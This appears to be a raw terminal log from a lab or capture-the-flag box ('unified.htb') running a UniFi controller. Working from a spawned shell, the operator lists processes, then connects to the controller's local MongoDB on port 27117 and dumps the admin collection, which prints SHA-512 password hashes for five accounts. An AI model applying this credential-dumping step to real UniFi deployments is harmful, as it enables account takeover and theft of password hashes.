@@ -1,0 +1,657 @@
+unifi@unified:/usr/lib/unifi$ ps aux
+ps aux
+USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+unifi          1  0.0  0.0   1080     4 ?        Ss   20:11   0:00 /sbin/docker-
+unifi          8  0.0  0.1  18512  3176 ?        S    20:11   0:00 bash /usr/loc
+unifi         18  2.2 22.6 3668768 461320 ?      Sl   20:11   0:24 java -Dunifi.
+unifi         68  0.2  4.1 1100672 84456 ?       Sl   20:12   0:02 bin/mongod --
+unifi        596  0.0  0.1  18380  2992 ?        S    20:29   0:00 bash -c {echo
+unifi        600  0.0  0.1  18512  3448 ?        S    20:29   0:00 bash -i
+unifi        603  0.0  0.1  18380  3080 ?        S    20:29   0:00 bash
+unifi        616  0.0  0.1  19312  2224 ?        S    20:29   0:00 script /dev/n
+unifi        617  0.0  0.0   4632   924 pts/0    Ss   20:29   0:00 sh -c bash
+unifi        618  0.0  0.1  18512  3352 pts/0    S    20:29   0:00 bash
+unifi        622  0.0  0.1  34408  2828 pts/0    R+   20:29   0:00 ps aux
+unifi@unified:/usr/lib/unifi$ ps aux | grep mong
+ps aux | grep mong
+unifi         68  0.2  4.1 1100672 84456 ?       Sl   20:12   0:02 bin/mongod --dbpath /usr/lib/unifi/data/db --port 27117 --unixSocketPrefix /usr/lib/unifi/run --logRotate reopen --logappend --logpath /usr/lib/unifi/logs/mongod.log --pidfilepath /usr/lib/unifi/run/mongod.pid --bind_ip 127.0.0.1
+unifi        624  0.0  0.0  11468  1084 pts/0    S+   20:29   0:00 grep mong
+unifi@unified:/usr/lib/unifi$ db
+db
+bash: db: command not found
+unifi@unified:/usr/lib/unifi$ mongo
+mongo
+MongoDB shell version v3.6.3
+connecting to: mongodb://127.0.0.1:27017
+2024-05-03T20:30:47.662+0100 W NETWORK  [thread1] Failed to connect to 127.0.0.1:27017, in(checking socket for error after poll), reason: Connection refused
+2024-05-03T20:30:47.663+0100 E QUERY    [thread1] Error: couldn't connect to server 127.0.0.1:27017, connection attempt failed :
+connect@src/mongo/shell/mongo.js:251:13
+@(connect):1:6
+exception: connect failed
+unifi@unified:/usr/lib/unifi$ mongo -h
+mongo -h
+MongoDB shell version v3.6.3
+usage: mongo [options] [db address] [file names (ending in .js)]
+db address can be:
+  foo                   foo database on local machine
+  192.168.0.5/foo       foo database on 192.168.0.5 machine
+  192.168.0.5:9999/foo  foo database on 192.168.0.5 machine on port 9999
+Options:
+  --shell                             run the shell after executing files
+  --nodb                              don't connect to mongod on startup - no 
+                                      'db address' arg expected
+  --norc                              will not run the ".mongorc.js" file on 
+                                      start up
+  --quiet                             be less chatty
+  --port arg                          port to connect to
+  --host arg                          server to connect to
+  --eval arg                          evaluate javascript
+  -h [ --help ]                       show this usage information
+  --version                           show version information
+  --verbose                           increase verbosity
+  --ipv6                              enable IPv6 support (disabled by default)
+  --disableJavaScriptJIT              disable the Javascript Just In Time 
+                                      compiler
+  --disableJavaScriptProtection       allow automatic JavaScript function 
+                                      marshalling
+  --ssl                               use SSL for all connections
+  --sslCAFile arg                     Certificate Authority file for SSL
+  --sslPEMKeyFile arg                 PEM certificate/key file for SSL
+  --sslPEMKeyPassword arg             password for key in PEM file for SSL
+  --sslCRLFile arg                    Certificate Revocation List file for SSL
+  --sslAllowInvalidHostnames          allow connections to servers with 
+                                      non-matching hostnames
+  --sslAllowInvalidCertificates       allow connections to servers with invalid
+                                      certificates
+  --sslFIPSMode                       activate FIPS 140-2 mode at startup
+  --retryWrites                       automatically retry write operations upon
+                                      transient network errors
+  --jsHeapLimitMB arg                 set the js scope's heap size limit
+
+Authentication Options:
+  -u [ --username ] arg               username for authentication
+  -p [ --password ] arg               password for authentication
+  --authenticationDatabase arg        user source (defaults to dbname)
+  --authenticationMechanism arg       authentication mechanism
+  --gssapiServiceName arg (=mongodb)  Service name to use when authenticating 
+                                      using GSSAPI/Kerberos
+  --gssapiHostName arg                Remote host name to use for purpose of 
+                                      GSSAPI/Kerberos authentication
+
+file names: a list of files to run. files have to end in .js and will exit after unless --shell is specified
+unifi@unified:/usr/lib/unifi$ mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"
+<17 ace --eval "db.admin.find().forEach(printjson);"
+MongoDB shell version v3.6.3
+connecting to: mongodb://127.0.0.1:27117/ace
+MongoDB server version: 3.6.3
+{
+	"_id" : ObjectId("61ce278f46e0fb0012d47ee4"),
+	"name" : "administrator",
+	"email" : "administrator@unified.htb",
+	"x_shadow" : "$6$Ry6Vdbse$8enMR5Znxoo.WfCMd/Xk65GwuQEPx1M.QP8/qHiQV0PvUc3uHuonK4WcTQFN1CRk3GwQaquyVwCVq8iQgPTt4.",
+	"time_created" : NumberLong(1640900495),
+	"last_site_name" : "default",
+	"ui_settings" : {
+		"neverCheckForUpdate" : true,
+		"statisticsPrefferedTZ" : "SITE",
+		"statisticsPreferBps" : "",
+		"tables" : {
+			"device" : {
+				"sortBy" : "type",
+				"isAscending" : true,
+				"initialColumns" : [
+					"type",
+					"deviceName",
+					"status",
+					"connection",
+					"network",
+					"ipAddress",
+					"experience",
+					"firmwareStatus",
+					"downlink",
+					"uplink",
+					"dailyUsage"
+				],
+				"columns" : [
+					"type",
+					"deviceName",
+					"status",
+					"macAddress",
+					"model",
+					"ipAddress",
+					"connection",
+					"network",
+					"experience",
+					"firmwareStatus",
+					"firmwareVersion",
+					"memoryUsage",
+					"cpuUsage",
+					"loadAverage",
+					"utilization",
+					"clients",
+					"lastSeen",
+					"downlink",
+					"uplink",
+					"dailyUsage",
+					"uptime",
+					"wlan2g",
+					"wlan5g",
+					"radio2g",
+					"radio5g",
+					"clients2g",
+					"clients5g",
+					"bssid",
+					"tx",
+					"rx",
+					"tx2g",
+					"tx5g",
+					"channel",
+					"channel2g",
+					"channel5g"
+				]
+			},
+			"client" : {
+				"sortBy" : "physicalName",
+				"isAscending" : true,
+				"initialColumns" : [
+					"status",
+					"clientName",
+					"physicalName",
+					"connection",
+					"ip",
+					"experience",
+					"Downlink",
+					"Uplink",
+					"dailyUsage"
+				],
+				"columns" : [
+					"status",
+					"clientName",
+					"mac",
+					"physicalName",
+					"connection",
+					"network",
+					"interface",
+					"wifi_band",
+					"ip",
+					"experience",
+					"Downlink",
+					"Uplink",
+					"dailyUsage",
+					"uptime",
+					"channel",
+					"Uplink_apPort",
+					"signal",
+					"txRate",
+					"rxRate",
+					"first_seen",
+					"last_seen",
+					"rx_packets",
+					"tx_packets"
+				],
+				"filters" : {
+					"status" : {
+						"active" : true
+					},
+					"connection_type" : {
+						"ng" : true,
+						"na" : true,
+						"wired" : true,
+						"vpn" : true
+					},
+					"clients_type" : {
+						"users" : true,
+						"guests" : true
+					},
+					"device" : {
+						"device" : ""
+					}
+				}
+			},
+			"unifiDevice" : {
+				"sortBy" : "type",
+				"isAscending" : true,
+				"columns" : [
+					"type",
+					"name",
+					"status",
+					"macAddress",
+					"model",
+					"ipAddress",
+					"connection",
+					"network",
+					"experience",
+					"firmwareStatus",
+					"firmwareVersion",
+					"memoryUsage",
+					"cpuUsage",
+					"loadAverage",
+					"utilization",
+					"clients",
+					"dailyUsage",
+					"lastSeen",
+					"downlink",
+					"uplink",
+					"uptime",
+					"wlan2g",
+					"wlan5g",
+					"radio2g",
+					"radio5g",
+					"clients2g",
+					"clients5g",
+					"bssid",
+					"tx",
+					"rx",
+					"tx2g",
+					"tx5g",
+					"channel",
+					"channel2g",
+					"channel5g"
+				],
+				"initialColumns" : [
+					"type",
+					"name",
+					"status",
+					"connection",
+					"network",
+					"ipAddress",
+					"experience",
+					"firmwareStatus",
+					"downlink",
+					"uplink",
+					"dailyUsage"
+				]
+			},
+			"unifiDeviceNetwork" : {
+				"sortBy" : "type",
+				"isAscending" : true,
+				"columns" : [
+					"type",
+					"name",
+					"status",
+					"macAddress",
+					"model",
+					"ipAddress",
+					"connection",
+					"network",
+					"experience",
+					"firmwareStatus",
+					"firmwareVersion",
+					"memoryUsage",
+					"cpuUsage",
+					"loadAverage",
+					"utilization",
+					"clients",
+					"dailyUsage",
+					"lastSeen",
+					"downlink",
+					"uplink",
+					"uptime",
+					"wlan2g",
+					"wlan5g",
+					"radio2g",
+					"radio5g",
+					"clients2g",
+					"clients5g",
+					"bssid",
+					"tx",
+					"rx",
+					"tx2g",
+					"tx5g",
+					"channel",
+					"channel2g",
+					"channel5g"
+				],
+				"initialColumns" : [
+					"type",
+					"name",
+					"status",
+					"connection",
+					"network",
+					"ipAddress",
+					"experience",
+					"firmwareStatus",
+					"downlink",
+					"uplink",
+					"dailyUsage"
+				]
+			},
+			"unifiDeviceAccess" : {
+				"sortBy" : "type",
+				"isAscending" : true,
+				"columns" : [
+					"type",
+					"name",
+					"status",
+					"macAddress",
+					"model",
+					"ipAddress",
+					"connection",
+					"network",
+					"experience",
+					"firmwareStatus",
+					"firmwareVersion",
+					"memoryUsage",
+					"cpuUsage",
+					"loadAverage",
+					"utilization",
+					"clients",
+					"dailyUsage",
+					"lastSeen",
+					"downlink",
+					"uplink",
+					"uptime",
+					"wlan2g",
+					"wlan5g",
+					"radio2g",
+					"radio5g",
+					"clients2g",
+					"clients5g",
+					"bssid",
+					"tx",
+					"rx",
+					"tx2g",
+					"tx5g",
+					"channel",
+					"channel2g",
+					"channel5g"
+				],
+				"initialColumns" : [
+					"type",
+					"name",
+					"status",
+					"connection",
+					"network",
+					"ipAddress",
+					"experience",
+					"firmwareStatus",
+					"downlink",
+					"uplink",
+					"dailyUsage"
+				]
+			},
+			"unifiDeviceProtect" : {
+				"sortBy" : "type",
+				"isAscending" : true,
+				"columns" : [
+					"type",
+					"name",
+					"status",
+					"macAddress",
+					"model",
+					"ipAddress",
+					"connection",
+					"network",
+					"experience",
+					"firmwareStatus",
+					"firmwareVersion",
+					"memoryUsage",
+					"cpuUsage",
+					"loadAverage",
+					"utilization",
+					"clients",
+					"dailyUsage",
+					"lastSeen",
+					"downlink",
+					"uplink",
+					"uptime",
+					"wlan2g",
+					"wlan5g",
+					"radio2g",
+					"radio5g",
+					"clients2g",
+					"clients5g",
+					"bssid",
+					"tx",
+					"rx",
+					"tx2g",
+					"tx5g",
+					"channel",
+					"channel2g",
+					"channel5g"
+				],
+				"initialColumns" : [
+					"type",
+					"name",
+					"status",
+					"connection",
+					"network",
+					"ipAddress",
+					"experience",
+					"firmwareStatus",
+					"downlink",
+					"uplink",
+					"dailyUsage"
+				]
+			},
+			"unifiDeviceTalk" : {
+				"sortBy" : "type",
+				"isAscending" : true,
+				"columns" : [
+					"type",
+					"name",
+					"status",
+					"macAddress",
+					"model",
+					"ipAddress",
+					"connection",
+					"network",
+					"experience",
+					"firmwareStatus",
+					"firmwareVersion",
+					"memoryUsage",
+					"cpuUsage",
+					"loadAverage",
+					"utilization",
+					"clients",
+					"dailyUsage",
+					"lastSeen",
+					"downlink",
+					"uplink",
+					"uptime",
+					"wlan2g",
+					"wlan5g",
+					"radio2g",
+					"radio5g",
+					"clients2g",
+					"clients5g",
+					"bssid",
+					"tx",
+					"rx",
+					"tx2g",
+					"tx5g",
+					"channel",
+					"channel2g",
+					"channel5g"
+				],
+				"initialColumns" : [
+					"type",
+					"name",
+					"status",
+					"connection",
+					"network",
+					"ipAddress",
+					"experience",
+					"firmwareStatus",
+					"downlink",
+					"uplink",
+					"dailyUsage"
+				]
+			},
+			"insights/wifiScanner" : {
+				"sortBy" : "apCount",
+				"isAscending" : false,
+				"initialColumns" : [
+					"apCount",
+					"essid",
+					"bssid",
+					"security",
+					"radio",
+					"signal",
+					"channel",
+					"band",
+					"bw",
+					"oui",
+					"date",
+					"ap_mac"
+				],
+				"columns" : [
+					"apCount",
+					"essid",
+					"bssid",
+					"security",
+					"radio",
+					"signal",
+					"channel",
+					"band",
+					"bw",
+					"oui",
+					"date",
+					"ap_mac"
+				]
+			},
+			"insights/wifiMan" : {
+				"sortBy" : "date",
+				"isAscending" : false,
+				"initialColumns" : [
+					"clinet_name",
+					"client_wifi_experience",
+					"device_model",
+					"device_name",
+					"wlan_essid",
+					"client_signal",
+					"wlan_channel_width",
+					"down",
+					"up",
+					"endPoint",
+					"rate",
+					"date"
+				],
+				"columns" : [
+					"clinet_name",
+					"client_wifi_experience",
+					"device_model",
+					"device_name",
+					"wlan_essid",
+					"client_signal",
+					"wlan_channel_width",
+					"down",
+					"up",
+					"endPoint",
+					"rate",
+					"date"
+				]
+			}
+		},
+		"topologyViewSettings" : {
+			"showAllDevices" : true,
+			"showAllClients" : true,
+			"show2GClients" : true,
+			"show5GClients" : true,
+			"showWiredClients" : true,
+			"showSSID" : false,
+			"showWifiExperience" : true,
+			"showRadioChannel" : false,
+			"showWifiStandards" : false,
+			"showWiredSpeed" : false,
+			"showWiredPorts" : false,
+			"online" : true,
+			"offline" : true,
+			"isolated" : true,
+			"pending_adoption" : true,
+			"managed_by_another_console" : true
+		},
+		"preferences" : {
+			"alertsPosition" : "top_right",
+			"allowHiddenDashboardModules" : false,
+			"browserLogLevel" : "INFO",
+			"bypassAutoFindDevices" : false,
+			"bypassConfirmAdoptAndUpgrade" : false,
+			"bypassConfirmBlock" : false,
+			"bypassConfirmRestart" : false,
+			"bypassConfirmUpgrade" : false,
+			"bypassHybridDashboardNotice" : false,
+			"bypassDashboardUdmProAd" : false,
+			"bypassHybridSettingsNotice" : false,
+			"dateFormat" : "MMM DD YYYY",
+			"dismissWlanOverrides" : false,
+			"enableNewUI" : false,
+			"hideV3SettingsIntro" : true,
+			"isAppDark" : true,
+			"isPropertyPanelFixed" : true,
+			"isRegularGraphForAirViewEnabled" : false,
+			"isResponsive" : false,
+			"isSettingsDark" : true,
+			"isUndockedByDefault" : false,
+			"noWhatsNew" : false,
+			"propertyPanelCollapse" : false,
+			"propertyPanelMultiMode" : true,
+			"refreshButtonEnabled" : false,
+			"refreshRate" : "2MIN",
+			"refreshRateRememberAll" : false,
+			"rowsPerPage" : 50,
+			"showAllPanelActions" : false,
+			"showWifimanAppsBanner" : true,
+			"timeFormat" : "H:mm",
+			"use24HourTime" : true,
+			"useBrowserTheme" : false,
+			"useSettingsPanelView" : false,
+			"websocketEnabled" : true,
+			"withStickyTableActions" : true,
+			"isUlteModalClosed" : false,
+			"isUbbAlignmentToolModalClosed" : false,
+			"offlineClientTimeframe" : 24
+		},
+		"preferredLanguage" : "en",
+		"dashboardConfig" : {
+			"lastActiveDashboardId" : "61ce269d46e0fb0012d47ec6"
+		}
+	},
+	"requires_new_password" : false,
+	"email_alert_enabled" : true,
+	"email_alert_grouping_enabled" : true,
+	"html_email_enabled" : true,
+	"is_professional_installer" : false,
+	"push_alert_enabled" : true
+}
+{
+	"_id" : ObjectId("61ce4a63fbce5e00116f424f"),
+	"email" : "michael@unified.htb",
+	"name" : "michael",
+	"x_shadow" : "$6$spHwHYVF$mF/VQrMNGSau0IP7LjqQMfF5VjZBph6VUf4clW3SULqBjDNQwW.BlIqsafYbLWmKRhfWTiZLjhSP.D/M1h5yJ0",
+	"requires_new_password" : false,
+	"time_created" : NumberLong(1640909411),
+	"last_site_name" : "default",
+	"email_alert_enabled" : false,
+	"email_alert_grouping_enabled" : false,
+	"email_alert_grouping_delay" : 60,
+	"push_alert_enabled" : false
+}
+{
+	"_id" : ObjectId("61ce4ce8fbce5e00116f4251"),
+	"email" : "seamus@unified.htb",
+	"name" : "Seamus",
+	"x_shadow" : "$6$NT.hcX..$aFei35dMy7Ddn.O.UFybjrAaRR5UfzzChhIeCs0lp1mmXhVHol6feKv4hj8LaGe0dTiyvq1tmA.j9.kfDP.xC.",
+	"requires_new_password" : true,
+	"time_created" : NumberLong(1640910056),
+	"last_site_name" : "default"
+}
+{
+	"_id" : ObjectId("61ce4d27fbce5e00116f4252"),
+	"email" : "warren@unified.htb",
+	"name" : "warren",
+	"x_shadow" : "$6$DDOzp/8g$VXE2i.FgQSRJvTu.8G4jtxhJ8gm22FuCoQbAhhyLFCMcwX95ybr4dCJR/Otas100PZA9fHWgTpWYzth5KcaCZ.",
+	"requires_new_password" : true,
+	"time_created" : NumberLong(1640910119),
+	"last_site_name" : "default"
+}
+{
+	"_id" : ObjectId("61ce4d51fbce5e00116f4253"),
+	"email" : "james@unfiied.htb",
+	"name" : "james",
+	"x_shadow" : "$6$ON/tM.23$cp3j11TkOCDVdy/DzOtpEbRC5mqbi1PPUM6N4ao3Bog8rO.ZGqn6Xysm3v0bKtyclltYmYvbXLhNybGyjvAey1",
+	"requires_new_password" : false,
+	"time_created" : NumberLong(1640910161),
+	"last_site_name" : "default"
+}
+
